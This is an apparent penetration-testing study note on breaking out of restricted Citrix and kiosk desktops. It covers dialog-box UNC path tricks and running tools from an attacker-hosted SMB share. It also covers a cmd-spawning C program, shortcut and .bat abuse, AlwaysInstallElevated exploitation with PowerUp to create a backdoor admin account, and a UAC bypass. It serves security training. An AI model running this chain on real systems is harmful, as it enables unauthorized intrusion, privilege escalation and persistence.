# Citrix Breakout — Restricted Environment Escape

## Overview
Organizations use virtualization platforms (Citrix, Terminal Services, AWS AppStream, CyberArk PSM, Kiosks) with locked-down desktops to limit damage from compromised accounts. These restrictions can often be bypassed using a consistent methodology.

**Basic breakout methodology:**
1. Gain access to a Dialog Box
2. Exploit the Dialog Box to achieve command execution
3. Escalate privileges

---

## Step 1 — Bypassing Path Restrictions via Dialog Boxes

File Explorer may block direct browsing of `C:\` and `C:\Users`. However, applications with file interaction features (Save, Open, Browse, Import, Print, etc.) trigger Windows dialog boxes that can be used to navigate the filesystem freely.

**Common apps to abuse for dialog boxes:** Paint, Notepad, Wordpad, any installed Office app.

### Example — MS Paint
1. Open Paint from Start Menu
2. `File > Open` → dialog box appears
3. In the File name field, enter a UNC path:
```
\\127.0.0.1\c$\users\pmorgan
```
4. Set File-Type to **All Files**
5. Press Enter → navigate the filesystem freely

---

## Step 2 — Accessing SMB Shares from a Restricted Environment

File Explorer may block direct SMB access, but the dialog box UNC path trick bypasses this too.

**Set up an SMB server on attack host (Impacket):**
```bash
smbserver.py -smb2support share $(pwd)
```

**In the Citrix dialog box (e.g. Paint → File → Open):**
```
\\<attacker_ip>\share
```
Set File-Type to **All Files** → browse share contents.

**Execute tools directly from the share:** right-click an `.exe` → Open → runs in the Citrix context.

**Example — drop a cmd launcher (pwn.c):**
```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```
Compile, host on SMB share, open via dialog box → cmd prompt spawned.

---

## Step 3 — Alternative Methods to Get a Shell

### Alternate File Explorers
When standard File Explorer is blocked, use portable alternatives not affected by group policy:
- **Explorer++** (recommended — portable, fast, no install needed)
- **Q-Dir**

These can copy files from SMB shares when File Explorer cannot.

### Alternate Registry Editors
When `regedit.exe` is blocked:
- **Simpleregedit**
- **Uberregedit**
- **SmallRegistryEditor**

### Modifying Existing Shortcuts
1. Right-click any `.lnk` shortcut → Properties
2. Change the **Target** field to `C:\Windows\System32\cmd.exe`
3. Execute the shortcut → cmd spawns

If no shortcut exists: transfer one via SMB, or create one with PowerShell (`New-Object -ComObject WScript.Shell`).

### Script Execution
If `.bat`, `.vbs`, or `.ps1` extensions are associated with their interpreters:
1. Create a new text file on the desktop → rename to `evil.bat`
2. Open with Notepad, type: `cmd`
3. Save and run → Command Prompt opens

---

## Step 4 — Privilege Escalation

Once a CMD prompt is available, run **PowerUp.ps1** or **winPEAS** to enumerate misconfigurations.

### AlwaysInstallElevated
A misconfiguration allowing `.msi` files to install with SYSTEM privileges.

**Check manually:**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Vulnerable if both return `0x1`.

**Exploit with PowerUp:**
```powershell
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```
→ Creates `UserAdd.msi` on the Desktop.

**Run the MSI:** fill in Username, Password, Group = `Administrators` → creates a local admin backdoor account.

**Spawn cmd as the new user:**
```cmd
runas /user:backdoor cmd
```

---

## Step 5 — UAC Bypass

Even as a local admin, UAC may block access to `C:\Users\Administrator`. Bypass it:

```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```
→ New elevated PowerShell window opens.

**Confirm elevated privileges:**
```cmd
whoami /priv
whoami /all
```

---

## Key Takeaway
Citrix/locked-down environments often block direct access but leave enough surface to abuse:

| Technique | What It Bypasses |
|---|---|
| Dialog box UNC path | File Explorer path restrictions |
| SMB share via dialog box | Network share restrictions |
| Explorer++ / Q-Dir | GPO file copy restrictions |
| Shortcut target modification | Shell restriction |
| `.bat` script drop | Execution restriction |
| AlwaysInstallElevated + PowerUp | Privilege elevation |
| UAC bypass scripts | UAC prompt |

The chain: dialog box → shell → enumeration → AlwaysInstallElevated → backdoor admin → UAC bypass → full access.